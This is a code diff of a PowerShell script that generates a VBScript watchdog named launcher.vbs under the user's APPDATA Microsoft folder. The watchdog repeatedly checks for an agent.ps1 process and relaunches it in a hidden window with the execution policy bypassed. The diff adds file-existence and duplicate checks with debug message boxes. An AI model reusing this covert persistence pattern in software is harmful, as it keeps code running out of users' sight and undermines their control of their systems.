@@ -22,16 +22,31 @@ $vbsPath = Join-Path $env:APPDATA "Microsoft\launcher.vbs"
 $expectedVbs = @"
 Set objShell = CreateObject("WScript.Shell")
 Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 Do While True
+
+    fileExists = objFSO.FileExists("$agentPath")
+
+    If Not fileExists Then
+        MsgBox "file not exist"
+    End If
+    
     Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
-    agentRunning = False
+    
+    agentCount = 0
+
     For Each process In processes
-        If InStr(process.CommandLine, "agent.ps1") > 0 Then
-            agentRunning = True
+        If InStr(1, process.CommandLine, "agent.ps1", vbTextCompare) > 0 Then
+            agentCount = agentCount + 1
         End If
     Next
-    If Not agentRunning Then
+
+    If agentCount > 1 Then
+        MsgBox "Doublons !"
+    End If
+
+    If agentCount = 0 Then
         objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$agentPath""", 0, False
     End If
     WScript.Sleep 30000
